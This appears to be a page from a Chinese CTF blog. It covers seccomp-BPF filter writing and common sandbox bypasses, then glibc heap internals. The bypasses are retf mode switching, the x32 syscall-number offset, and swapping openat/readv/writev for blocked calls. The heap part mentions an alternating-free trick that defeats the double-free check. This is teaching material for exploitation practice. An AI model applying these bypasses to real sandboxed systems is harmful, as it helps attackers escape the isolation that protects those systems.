<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct sock_fprog &#123; /* Required for SO_ATTACH_FILTER. */</span><br><span class="line">unsigned short len; /* Number of filter blocks */</span><br><span class="line">struct sock_filter *filter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>a.len即代表语句条数，比如上面的就是4;</p>
<p>b.filter就是指向上面SECCOMP_MODE_FILTER这个结构体的指针。</p>
<p>▲所以完整的就是：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">struct sock_filter sfi[] = &#123;</span><br><span class="line">BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0),</span><br><span class="line">BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1),</span><br><span class="line">BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class="line">BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">&#125;;</span><br><span class="line">struct sock_fprog sfp = &#123;</span><br><span class="line">(unsigned short)(sizeof(filter)/sizeof(filter[0])),</span><br><span class="line">sfi,</span><br><span class="line">&#125;;</span><br><span class="line">prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); </span><br><span class="line">prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br></pre></td></tr></table></div></figure>

<p>这样设置后，出来的效果如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">root@241adce81c0a:/ctf/seccomp# seccomp-tools dump ./prctl_test2</span><br><span class="line">line  CODE JT   JF   K</span><br><span class="line">=================================</span><br><span class="line">0000: 0x20 0x00 0x00 0x00000000 A = sys_number</span><br><span class="line">0001: 0x15 0x00 0x01 0x0000003b if (A != execve) goto 0003</span><br><span class="line">0002: 0x06 0x00 0x00 0x00000000 return KILL</span><br><span class="line">0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW</span><br></pre></td></tr></table></div></figure>

<p>3.简单的seccomp规则写：</p>
<p>(1)依据简单语法写规则：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">A = sys_number</span><br><span class="line">A == 257? e0:next</span><br><span class="line">A == 1? ok:next</span><br><span class="line">return ALLOW</span><br><span class="line">e0:</span><br><span class="line">return ERRNO(0)</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></div></figure>

<p>保存为seccomp_asm</p>
<p>(2)利用seccomp-tools来生成：</p>
<p>seccomp-tools asm seccomp_asm -f raw|seccomp-tools disasm -</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">line  CODE JT   JF   K</span><br><span class="line">=================================</span><br><span class="line">0000: 0x20 0x00 0x00 0x00000000 A = sys_number</span><br><span class="line">0001: 0x15 0x02 0x00 0x00000101 if (A == openat) goto 0004</span><br><span class="line">0002: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0005</span><br><span class="line">0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW</span><br><span class="line">0004: 0x06 0x00 0x00 0x00050000 return ERRNO(0)</span><br><span class="line">0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW</span><br></pre></td></tr></table></div></figure>

<p>这样就可以方便写规则了，同样有个seccomp_bpf.h的东西，比较简单：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/ahupowerdns/secfilter/blob/master/seccomp-bpf.h" >secfilter/seccomp-bpf.h at master · ahupowerdns/secfilter · GitHub</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>4.常见种类及绕过方式：</p>
<p>(1)禁用execve函数时，但是需要getshell才行，此时存在满足一定条件可以使用shellcode：</p>
<p>①未检查arch：</p>
<p>尝试使用shellcode将处理器转换，如果是x64则转为i386，同理类似。这样系统调用号11就不会被解析为64位中的__x64_sys_munmap，而是32位中的sys_execve，绕过检查。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">to32:</span><br><span class="line">mov DWORD [rsp+4],0x23;</span><br><span class="line">retf;</span><br><span class="line"></span><br><span class="line">to64:</span><br><span class="line">mov DWORD [esp+4],0x33; </span><br><span class="line">retf;</span><br></pre></td></tr></table></div></figure>

<p>由于retf的指令实际效果为：POP CS:EIP，这里CS为0x23即为64位，0x33即为32位，所以如果能找到控制栈的gadget那其实也可以直接用retf，毕竟retf其实也挺常见的。同时还有其他的好用ret指令：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">RETQ：POP RIP</span><br><span class="line">RETN: POP EIP</span><br><span class="line">RETF: POP CS:EIP</span><br></pre></td></tr></table></div></figure>

<p>参考SCTF2020里面的CoolCode</p>
<p>②存在检查漏洞：if (A &lt; 0x40000000)，如果对A &gt;= 0x40000000没有限制，那么可以利用64位下的x32漏洞，使用 64位的存器地址和 32位的地址：</p>
<p>具体原理不太懂，应该是传参原因吧，可能syscall的系统调用号寄存器为eax，导致系统调用号0x40000003b绕过if (A &lt; 0x40000000)检查，然后以eax传入系统调用号为0x0000003b，仍然执行了execve。</p>
<p>这样的话在原来的系统调用号加上0x400000000即可绕过检查：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">mov rax,59+0x40000000;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></div></figure>

<p>(2)禁用evecve等函数，告诉了flag位置，或者将flag位置什么的放在了栈上(可以用peda插件：find flag)，又或者需要自己调试爆破flag的位置，不能getshell的，利用open,write,read等没有被禁用的函数进行读取：</p>
<p>①shellcode模式：这里就根据各种规则限制来绕过，自己编写shellcode。(这个需要汇编基础，遇到题目慢慢学吧)</p>
<p>②ROP模式：一般需要劫持栈再来ROP，其实和shellcode差不多的。这种情况一般是禁用了mprotect，所以没办法直接使用shellcode了，那么就利用ROP来搞，借助libc上的syscall。但是这里的open不知道为什么有时候执行不了，所以可以用借助syscall加上open的系统调用号来执行open。</p>
<p>如果没有禁止mprotect，那么通常可以配合SigreturnFrame()，free_hook，setcontext来将堆上内存权限改为可执行，然后再在堆上使用shellcode也可以。</p>
<p>▲有些禁用了open,write,read，那么其实这种情况下可以调用对应的openat，readv，和writev，其实效果一样的，因为前面三个函数其实都对应调用后面的三个函数。如果实在没办法打印，可以利用题目中的错误信息输出，修改IO_FILE来打印，读取。还有更强的用ptrace修改系统调用号，zer0pts CTF2020的sycall kit。实在找不到，后面再补坑吧。</p>
<p>(3)控制了open,write,read的参数：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">0000: 0x20 0x00 0x00 0x00000004 A = arch</span><br><span class="line">0001: 0x15 0x00 0x0b 0xc000003e if (A != ARCH_X86_64) goto 0013</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000 A = sys_number</span><br><span class="line">0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005</span><br><span class="line">0004: 0x15 0x00 0x08 0xffffffff if (A != 0xffffffff) goto 0013</span><br><span class="line">0005: 0x15 0x06 0x00 0x00000002 if (A == open) goto 0012</span><br><span class="line">0006: 0x15 0x00 0x06 0x00000000 if (A != read) goto 0013</span><br><span class="line">0007: 0x20 0x00 0x00 0x00000014 A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line">0008: 0x25 0x03 0x00 0x00000000 if (A &gt; 0x0) goto 0012</span><br><span class="line">0009: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0013</span><br><span class="line">0010: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)</span><br><span class="line">0011: 0x35 0x00 0x01 0x00000004 if (A &lt; 0x4) goto 0013</span><br><span class="line">0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW</span><br><span class="line">0013: 0x06 0x00 0x00 0x00000000 return KILL</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">0000: 0x20 0x00 0x00 0x00000004 A = arch</span><br><span class="line">0001: 0x15 0x00 0x12 0xc000003e if (A != ARCH_X86_64) goto 0020</span><br><span class="line">0002: 0x20 0x00 0x00 0x00000000 A = sys_number</span><br><span class="line">0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005</span><br><span class="line">0004: 0x15 0x00 0x0f 0xffffffff if (A != 0xffffffff) goto 0020</span><br><span class="line">0005: 0x15 0x0d 0x00 0x00000002 if (A == open) goto 0019</span><br><span class="line">0006: 0x15 0x0c 0x00 0x00000003 if (A == close) goto 0019</span><br><span class="line">0007: 0x15 0x0b 0x00 0x0000000a if (A == mprotect) goto 0019</span><br><span class="line">0008: 0x15 0x0a 0x00 0x000000e7 if (A == exit_group) goto 0019</span><br><span class="line">0009: 0x15 0x00 0x04 0x00000000 if (A != read) goto 0014</span><br><span class="line">0010: 0x20 0x00 0x00 0x00000014 A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line">0011: 0x15 0x00 0x08 0x00000000 if (A != 0x0) goto 0020</span><br><span class="line">0012: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)</span><br><span class="line">0013: 0x15 0x05 0x06 0x00000000 if (A == 0x0) goto 0019 else goto 0020</span><br><span class="line">0014: 0x15 0x00 0x05 0x00000001 if (A != write) goto 0020</span><br><span class="line">0015: 0x20 0x00 0x00 0x00000014 A = fd &gt;&gt; 32 # write(fd, buf, count)</span><br><span class="line">0016: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0020</span><br><span class="line">0017: 0x20 0x00 0x00 0x00000010 A = fd # write(fd, buf, count)</span><br><span class="line">0018: 0x15 0x00 0x01 0x00000001 if (A != 0x1) goto 0020</span><br><span class="line">0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW</span><br><span class="line">0020: 0x06 0x00 0x00 0x00000000 return KILL</span><br></pre></td></tr></table></div></figure>

<p>类似这种限制fd的，可以先close再open，改变fd，同样对应参数也可以适当做一些修改来绕过。</p>
<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/p0lar1s/p/14697070.html#%E5%9F%BA%E4%BA%8Ebpf%E4%BC%AF%E5%85%8B%E5%88%A9%E5%88%86%E7%BB%84%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84seccomp%E5%BA%93%E5%87%BD%E6%95%B0" >seccomp沙盒逃逸基础——沙盒的规则编写 - p0lar1s - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><a target="_blank" rel="noopener" href="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">(<em>´∇｀</em>) 被你发现啦~ seccomp学习笔记 | A1ex’s Blog</a></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219077#h2-0" >PWN题中常见的seccomp绕过方法 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208364#h2-10" >Seccomp从0到1 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>等等，贴不过来了。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/%E5%A0%86%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">堆前置知识总结</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-22</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="一、main-arena总概"   >
          <a href="#一、main-arena总概" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、main-arena总概" class="headerlink" title="一、main_arena总概"></a>一、main_arena总概</h1>
      
        <h2 id="1-arena"   >
          <a href="#1-arena" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-arena" class="headerlink" title="1.arena:"></a>1.arena:</h2>
      <p>堆内存本身</p>

        <h3 id="1-主线程的main-arena"   >
          <a href="#1-主线程的main-arena" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-主线程的main-arena" class="headerlink" title="(1)主线程的main_arena:"></a>(1)主线程的main_arena:</h3>
      <p>由sbrk函数创建。</p>
<ul>
<li><p>最开始调用sbrk函数创建大小为(128 KB + chunk_size) align 4KB 的空间作为 heap</p>
</li>
<li><p>当t不够用时，用sbrk或者mmap增加heap大小。</p>
</li>
</ul>

        <h3 id="2-其它线程的per-thread-arena"   >
          <a href="#2-其它线程的per-thread-arena" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-其它线程的per-thread-arena" class="headerlink" title="(2)其它线程的per thread arena:"></a>(2)其它线程的per thread arena:</h3>
      <p>由mmap创建。</p>
<ul>
<li><p>最开始调用 mmap 映射一块大小为HEAP_MAX_SIZE（32 位系统上默认为 1MB，64 位系统上默认为 64MB）的空间作为 sub-heap。</p>
</li>
<li><p>当不够用时，会调用 mmap 映射一块新的 sub-heap，也就是增加 top chunk 的大小，每次 heap 增加的值都会对齐到4KB。</p>
</li>
</ul>

        <h2 id="2-malloc-state"   >
          <a href="#2-malloc-state" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-malloc-state" class="headerlink" title="2.malloc_state:"></a>2.malloc_state:</h2>
      <p>管理arena的一个结构，包括堆状态信息，bins链表等等</p>

        <h3 id="1-main-arena"   >
          <a href="#1-main-arena" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-main-arena" class="headerlink" title="(1)main_arena"></a>(1)main_arena</h3>
      <p>对应的malloc_state结构的全局指针存储在glibc的全局变量中</p>
<p>(如果可以泄露malloc_state结构体的地址，那么就可以泄露glibc的地址)</p>

        <h3 id="2-per-thread-arena"   >
          <a href="#2-per-thread-arena" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-per-thread-arena" class="headerlink" title="(2)per thread arena"></a>(2)per thread arena</h3>
      <p>对应的malloc_state存储在各自本身的arena</p>

        <h2 id="3-bins"   >
          <a href="#3-bins" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-bins" class="headerlink" title="3.bins:"></a>3.bins:</h2>
      <p>用链表结构管理空闲的chunk块，通过free释放进入的chunk块(垃圾桶)</p>

        <h2 id="4-chunks"   >
          <a href="#4-chunks" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-chunks" class="headerlink" title="4.chunks:"></a>4.chunks:</h2>
      <p>一般意义上的堆内存块</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span>&#123;</span></span><br><span class="line"><span class="keyword">mutex_t</span> mutex;<span class="comment">//(相当于多线程的互斥锁)</span></span><br><span class="line"><span class="keyword">int</span> flags;<span class="comment">//(记录分配器的一些标志，bit0 用于标识分配区是否包含至少一个 fast bin chunk，bit1 用于标识分配区是否能返回连续的虚拟地址空间。)</span></span><br><span class="line">mfastbinptr fastbinsY[NFASTBINS];<span class="comment">//(一个数组，里面的元素是各个不同大小的fastbins的首地址)</span></span><br><span class="line">mchunkptr top;<span class="comment">//(top chunk的首地址)</span></span><br><span class="line">mchunkptr last_remainder;<span class="comment">//(某些情况下切割剩下来的堆块)</span></span><br><span class="line">mchunkptr bins[NBINS*<span class="number">2</span><span class="number">-2</span>];</span><br><span class="line">.......................................................</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];<span class="comment">//(以bit为单位的数组，共128bit，16个字节，4个int，由于bin的数量为128，对于这里面的128bit，为0表该bin没用有空闲块，为1表有空闲块。通过四个int的大小可以找出不同index的bin中是否有空闲块。这个在某些时候会用到。)</span></span><br><span class="line">......<span class="comment">//后面还有，不太重要</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>▲内存中的堆情况：</p>
<p>全局变量glibc:main_arena = struct malloc_state:</p>
<div class="table-container"><table>
<thead>
<tr>
<th>mutes</th>
<th>bin</th>
<th>…..</th>
<th>top</th>
<th>lastremainder</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table></div>
<div class="table-container"><table>
<thead>
<tr>
<th>Allocated chunk</th>
<th>Allocated chunk</th>
<th>Freechunk1</th>
<th>Allocated chunk</th>
<th>Freechunk2</th>
<th>Allocated chunk</th>
<th>Topchunk</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table></div>
<p>低地址————————————————————- ——————&gt;高地址</p>
<p>由sbrk创建的main_arena:</p>
<ul>
<li><p>可以把bin也当作一个chunk，不同Bins管理结构不同，有单向链表管理和双向链表管理。</p>
</li>
<li><p>top里的bk保存Topchunk的首地址。</p>
</li>
</ul>
<p>(bk和fd只用于Bins链表中，allocated_chunk中是属于用户可以使用的内容)</p>

        <h1 id="二、chunk结构："   >
          <a href="#二、chunk结构：" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、chunk结构：" class="headerlink" title="二、chunk结构："></a>二、chunk结构：</h1>
      
        <h2 id="1-chunk状态"   >
          <a href="#1-chunk状态" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-chunk状态" class="headerlink" title="1.chunk状态"></a>1.chunk状态</h2>
      
        <h3 id="1-allocated-chunk："   >
          <a href="#1-allocated-chunk：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-allocated-chunk：" class="headerlink" title="(1)allocated_chunk："></a>(1)allocated_chunk：</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.png" alt="img"></p>

        <h3 id="2-free-chunk"   >
          <a href="#2-free-chunk" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-free-chunk" class="headerlink" title="(2)free_chunk:"></a>(2)free_chunk:</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2.png" alt="img"></p>

        <h2 id="2-prev-size："   >
          <a href="#2-prev-size：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-prev-size：" class="headerlink" title="2.prev_size："></a>2.prev_size：</h2>
      <p>8字节，保存前一个chunk的大小，在allocatedchunk中属于用户数据，参考上述的图片，free_chunk的下一个chunk的pre_size位为该free_chunk的size。</p>

        <h2 id="3-size"   >
          <a href="#3-size" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-size" class="headerlink" title="3.size:"></a>3.size:</h2>
      
        <h3 id="1-size含义"   >
          <a href="#1-size含义" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-size含义" class="headerlink" title="(1)size含义"></a>(1)size含义</h3>
      <p>8字节，保存当前chunk大小。(free和allocated都有用)一个chunk的size以0x10递增，以0x20为最小chunk。</p>
<ul>
<li><p>malloc(0x01)：会有0x20这么大，实际用户可用数据就是0x18。size=0x21</p>
</li>
<li><p>malloc(0x01-0x18)：仍然0x20这么大，实际用户可用数据就是0x18。size=0x21</p>
</li>
<li><p>malloc(0x18)：会有0x30这么大，实际用户可用数据是0x28。size=0x31</p>
</li>
</ul>
<p>所以size这个8字节内存的最低4位都不会被用到，所以malloc管理机制给最低的3位搞了个特殊形式标志位，A,M,P，分别代表不同内容。</p>

        <h3 id="2-AMP标志位"   >
          <a href="#2-AMP标志位" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-AMP标志位" class="headerlink" title="(2)AMP标志位"></a>(2)AMP标志位</h3>
      
        <h4 id="①A-NON-MAIN-ARENA"   >
          <a href="#①A-NON-MAIN-ARENA" class="heading-link"><i class="fas fa-link"></i></a><a href="#①A-NON-MAIN-ARENA" class="headerlink" title="①A:NON_MAIN_ARENA"></a>①A:NON_MAIN_ARENA</h4>
      <p>代表是否属于非main_arena，1表是，0表否。就是线程的不同。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="②M-IS-MMAPPED"   >
          <a href="#②M-IS-MMAPPED" class="heading-link"><i class="fas fa-link"></i></a><a href="#②M-IS-MMAPPED" class="headerlink" title="②M:IS_MMAPPED"></a>②M:IS_MMAPPED</h4>
      <p>代表当前chunk是否是mmap出来的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="③P-PREV-INUSE"   >
          <a href="#③P-PREV-INUSE" class="heading-link"><i class="fas fa-link"></i></a><a href="#③P-PREV-INUSE" class="headerlink" title="③P:PREV_INUSE"></a>③P:PREV_INUSE</h4>
      <p>代表前一个chunk是否正在被使用，处于allocated还是free。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p) ((p)-&gt;size &amp; PREV_INUSE)</span></span><br></pre></td></tr></table></div></figure>

<p>(标志位为1都代表是，0都代表否)</p>

        <h1 id="三、bins结构："   >
          <a href="#三、bins结构：" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、bins结构：" class="headerlink" title="三、bins结构："></a>三、bins结构：</h1>
      
        <h2 id="1-fastbins"   >
          <a href="#1-fastbins" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-fastbins" class="headerlink" title="1.fastbins"></a>1.fastbins</h2>
      <p>放在struct malloc_state中的mfastbinptr fastbinsY[NFASTBINS]数组中。</p>

        <h3 id="1-归类方式："   >
          <a href="#1-归类方式：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-归类方式：" class="headerlink" title="(1)归类方式："></a>(1)归类方式：</h3>
      <p>只使用fd位</p>
<ul>
<li><p>bin的index为1，bins[0],bins[1]组成一个bin。</p>
</li>
<li><p>规定大小的chunk归到一类，但个数有限，不同版本不同，同时也可以设置其范围：</p>
</li>
</ul>
<p>M_MXFAST即为其最大的参数，可以通过 mallopt()进行设置，但最大只能是80B。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.jpg" alt="img"></p>

        <h3 id="2-单向链表："   >
          <a href="#2-单向链表：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-单向链表：" class="headerlink" title="(2)单向链表："></a>(2)单向链表：</h3>
      <p>▲例子：a=malloc(0x10); b=malloc(0x10); c=malloc(0x10); d=malloc(0x10)</p>
<p>FastbinY,d,c,b,a</p>
<ul>
<li>free(a)之后：</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fastbinY[<span class="number">0x20</span>]-&gt;a;       a.fd=<span class="number">0</span></span><br></pre></td></tr></table></div></figure>

<ul>
<li>free(b)之后：</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fastbinY[<span class="number">0x20</span>]-&gt;b;       b.fd=a       a.fd=<span class="number">0</span></span><br></pre></td></tr></table></div></figure>

<ul>
<li>free(c)之后：</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fastbinY[<span class="number">0x20</span>]-&gt;c;        c.fd=b       b.fd-&gt;a;    a.fd=<span class="number">0</span></span><br></pre></td></tr></table></div></figure>

<ul>
<li>free(d)之后：</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fastbinY[<span class="number">0x20</span>]-&gt;d;       d.fd=c       c.fd-&gt;b;     b.fd-&gt;a;    a.fd=<span class="number">0</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="3-后进先出："   >
          <a href="#3-后进先出：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-后进先出：" class="headerlink" title="(3)后进先出："></a>(3)后进先出：</h3>
      <ul>
<li><p>m=malloc(0x10):      m-&gt;d</p>
</li>
<li><p>n=malloc(0x10):      n-&gt;c</p>
</li>
</ul>

        <h3 id="4-IN-USE位"   >
          <a href="#4-IN-USE位" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-IN-USE位" class="headerlink" title="(4)IN_USE位:"></a>(4)IN_USE位:</h3>
      <p>如果某个chunk进入到fastbin中，那么该chunk的下一个chunk的IN_USE位还是为1，不会改变成0。</p>
<p>例子：a=malloc(0x10); b=malloc(0x10); c=malloc(0x10);</p>
<ul>
<li><p>free(a)之后:     b.p=1</p>
</li>
<li><p>free(b)之后：   c.p=1;   b.p=1</p>
</li>
</ul>
<p>p位不会变成0，如果该chunk进入到fastbins中。</p>
<p>可以进行free(0),free(1),free(0)，但是不能直接free(0)两次。</p>

        <h3 id="5-注意"   >
